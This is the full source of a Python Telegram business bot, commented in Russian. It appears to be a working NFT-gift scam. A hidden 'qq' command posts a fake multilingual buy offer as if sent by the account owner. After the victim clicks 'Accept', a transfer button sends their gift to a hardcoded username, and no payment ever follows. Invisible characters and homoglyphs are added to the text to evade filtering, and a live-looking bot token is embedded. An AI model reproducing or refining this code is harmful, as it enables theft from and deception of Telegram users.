import asyncio
import random
import time
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.enums import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramRetryAfter

# Настройки
TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
RECIPIENT = "@crypqtan"  # Юзернейм, куда передается НФТ

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Очередь и хранилища
message_queue = asyncio.Queue()
cooldowns = {}          # chat_id -> timestamp последнего запроса
last_user_messages = {} # chat_id -> message_id последнего сообщения юзера

# Словари локализации для офферов
LOCALES = {
    "ru": {
        "offer_text": "предлагает вам",
        "timer": "Предложение действует ещё",
        "lock": "Сделка фиксируется кнопкой Принять",
        "decline": "Отклонить",
        "accept": "Принять",
        "declined": "❌ Предложение отклонено.",
        "success_title": "Коллекционный предмет",
        "success_sold": "успешно продан!",
        "instruction": "Передайте коллекционный предмет покупателю для зачисления",
        "btn_transfer": "Передать НФТ",
        "btn_confirm": "Подтвердить передачу"
    },
    "eng": {
        "offer_text": "offers you",
        "timer": "Offer is valid for",
        "lock": "The deal is fixed by clicking Accept",
        "decline": "Decline",
        "accept": "Accept",
        "declined": "❌ Offer declined.",
        "success_title": "Collectible item",
        "success_sold": "successfully sold!",
        "instruction": "Transfer the collectible item to the buyer to receive",
        "btn_transfer": "Transfer NFT",
        "btn_confirm": "Confirm transfer"
    },
    "ukr": {
        "offer_text": "пропонує вам",
        "timer": "Пропозиція діє ще",
        "lock": "Угода фіксується кнопкою Прийняти",
        "decline": "Відхилити",
        "accept": "Прийняти",
        "declined": "❌ Пропозицію відхилено.",
        "success_title": "Колекційний предмет",
        "success_sold": "успішно продано!",
        "instruction": "Передайте колекційний предмет покупцю для зарахування",
        "btn_transfer": "Передати НФТ",
        "btn_confirm": "Підтвердити передачу"
    },
    "cn": {
        "offer_text": "向您出价",
        "timer": "报价有效时间",
        "lock": "点击接受以锁定交易",
        "decline": "拒绝",
        "accept": "接受",
        "declined": "❌ 报价已拒绝。",
        "success_title": "收藏品",
        "success_sold": "已成功售出！",
        "instruction": "请将收藏品转移给买家以获得",
        "btn_transfer": "转移 NFT",
        "btn_confirm": "确认转移"
    }
}

# Функция безопасного добавления невидимых символов
def randomize_text(text: str) -> str:
    invisible_chars = ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"]
    chars = list(text)
    for _ in range(random.randint(2, 4)):
        pos = random.randint(0, len(chars))
        chars.insert(pos, random.choice(invisible_chars))
    return "".join(chars)

# Функция безопасной замены гомоглифов
def apply_homoglyphs(text: str) -> str:
    homoglyph_map = {'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с', 'x': 'х'}
    if random.random() > 0.5:
        target_char = random.choice(list(homoglyph_map.keys()))
        if target_char in text:
            text = text.replace(target_char, homoglyph_map[target_char], 1)
    return text

def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
    loc = LOCALES.get(lang, LOCALES["ru"])
    slug = gift_name.replace(" ", "")
    
    raw_desc = f'Пользователь {loc["offer_text"]} {amount} {currency_symbol} за данный предмет.'
    raw_timer = f'{loc["timer"]} 5 ч. 59 мин.'
    raw_lock = loc["lock"]

    protected_desc = randomize_text(apply_homoglyphs(raw_desc))
    protected_timer = randomize_text(raw_timer)
    protected_lock = randomize_text(raw_lock)

    # Премиум-эмодзи в тексте карточки оффера
    icon_gift = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
    icon_timer = '<tg-emoji emoji-id="5778527486270770928">⏱</tg-emoji>'
    icon_lock = '<tg-emoji emoji-id="5875180111744995604">🔒</tg-emoji>'

    base = (
        f'{icon_gift} <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
        f'{protected_desc}\n\n'
        f'{icon_timer} <i>{protected_timer}</i>\n'
        f'{icon_lock} <i>{protected_lock}</i>'
    )
    return base

def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
    loc = LOCALES.get(lang, LOCALES["ru"])
    cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_symbol}|{lang}"
    decline_data = f"d|{gift_num}"

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=loc['decline'], 
                    callback_data=decline_data,
                    icon_custom_emoji_id="5778527486270770928"
                ),
                InlineKeyboardButton(
                    text=loc['accept'], 
                    callback_data=cb_data,
                    icon_custom_emoji_id="5776375003280838798"
                )
            ]
        ]
    )

def build_accept_text(gift_name, gift_num, currency_name, lang):
    loc = LOCALES.get(lang, LOCALES["ru"])
    slug = gift_name.replace(" ", "")
    
    # Премиум-эмодзи для текста успешной продажи
    icon_success = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
    icon_info = '<tg-emoji emoji-id="5875180111744995604">ℹ️</tg-emoji>'

    return (
        f'{icon_success} <b>{loc["success_title"]}:\n'
        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name}-{gift_num}</a> {loc["success_sold"]}</b>\n\n'
        f'{icon_info} {loc["instruction"]} {currency_name}.'
    )

def make_accept_keyboard(lang):
    loc = LOCALES.get(lang, LOCALES["ru"])
    recipient = RECIPIENT.lstrip("@")

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=loc['btn_transfer'], 
                    url=f"tg://send_gift?to={recipient}",
                    icon_custom_emoji_id="5875180111744995604"
                )
            ],
            [
                InlineKeyboardButton(
                    text=loc['btn_confirm'], 
                    callback_data="noop"
                )
            ],
        ]
    )

# Перехват команд владельца (формат: qq [ссылка] [сумма] [валюта] [язык])
@dp.business_message(F.text)
async def handle_business_command(message: Message):
    if not message.text:
        return

    text_clean = message.text.strip()
    if not text_clean.lower().startswith("qq"):
        return

    chat_id = message.chat.id
    last_user_messages[chat_id] = message.message_id

    current_time = time.time()
    if chat_id in cooldowns and current_time - cooldowns[chat_id] < 30:
        return

    parts = text_clean.split()
    if len(parts) < 3:
        return

    nft_url = next((p for p in parts if "t.me/nft/" in p), None)
    if not nft_url:
        return

    try:
        amount_str = next((p for p in parts if p.isdigit()), "1000")
        amount = int(amount_str)
    except ValueError:
        amount = 1000

    text_lower = text_clean.lower()
    if "gram" in text_lower:
        currency_symbol = "💎"
        currency_name = "Gram"
    else:
        currency_symbol = "⭐️"
        currency_name = "Stars"

    lang = "ru"
    for l in ["ukr", "eng", "cn", "ru"]:
        if l in text_lower:
            lang = l
            break

    try:
        slug_part = nft_url.split("/nft/")[-1]
        if "-" in slug_part:
            gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
            gift_num = int(gift_num_str)
            gift_name = gift_name_raw.replace("-", " ")
        else:
            return
    except Exception:
        return

    cooldowns[chat_id] = current_time

    await message_queue.put({
        "chat_id": chat_id,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "amount": amount,
        "currency_symbol": currency_symbol,
        "currency_name": currency_name,
        "lang": lang,
        "bcid": message.business_connection_id,
        "cmd_message_id": message.message_id
    })

@dp.callback_query(F.data.startswith("a|"))
async def accept_offer(cb: CallbackQuery):
    parts = cb.data.split("|")
    if len(parts) < 6:
        await cb.answer("Ошибка данных", show_alert=True)
        return

    _, gift_name, gift_num_str, amount, currency_symbol, lang = parts
    gift_num = int(gift_num_str)
    
    currency_name = "Gram" if currency_symbol == "💎" else "Stars"
    text = build_accept_text(gift_name, gift_num, currency_name, lang)
    bcid = cb.message.business_connection_id
    chat_id = cb.message.chat.id

    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=cb.message.message_id,
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=make_accept_keyboard(lang),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
        )
    except Exception as e:
        if "message is not modified" in str(e):
            await cb.answer("Предложение уже было принято!", show_alert=True)
            return
        logging.error(f"Error editing message: {e}")
        await cb.answer("Не удалось обновить оффер", show_alert=True)
        return

    await cb.answer("Предложение принято!")

@dp.callback_query(F.data.startswith("d|"))
async def decline_offer(cb: CallbackQuery):
    bcid = cb.message.business_connection_id
    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[cb.message.message_id]
        )
    except Exception as e:
        logging.error(f"Decline error: {e}")
    await cb.answer("Предложение отклонено")

@dp.callback_query(F.data == "noop")
async def noop_handler(cb: CallbackQuery):
    await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)

# Фоновый воркер с плавной защитной задержкой (3.0 - 5.0 сек)
async def sender_worker():
    while True:
        task = await message_queue.get()
        try:
            await asyncio.sleep(random.uniform(3.0, 5.0))

            text = build_offer_text(
                task["gift_name"], 
                task["gift_num"], 
                task["amount"], 
                task["currency_symbol"], 
                task["lang"]
            )
            keyboard = make_offer_keyboard(
                task["gift_name"], 
                task["gift_num"], 
                task["amount"], 
                task["currency_symbol"], 
                task["lang"]
            )

            # 1. Отправляем оффер
            sent_msg = await bot.send_message(
                chat_id=task["chat_id"],
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                business_connection_id=task["bcid"],
                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True),
                reply_to_message_id=last_user_messages.get(task["chat_id"])
            )

            # 2. Удаляем команду qq
            if task["bcid"] and sent_msg:
                await bot.delete_business_messages(
                    business_connection_id=task["bcid"],
                    message_ids=[task["cmd_message_id"]]
                )

        except TelegramRetryAfter as e:
            wait_time = e.retry_after + 1
            logging.warning(f"Flood control! Waiting for {wait_time} seconds...")
            await asyncio.sleep(wait_time)
            await message_queue.put(task)

        except Exception as e:
            logging.error(f"Worker execution error: {e}")
        finally:
            message_queue.task_done()

async def main():
    asyncio.create_task(sender_worker())
    await dp.start_polling(
        bot, 
        allowed_updates=["callback_query", "business_connection", "business_message"]
    )

if __name__ == "__main__":
    asyncio.run(main())
    
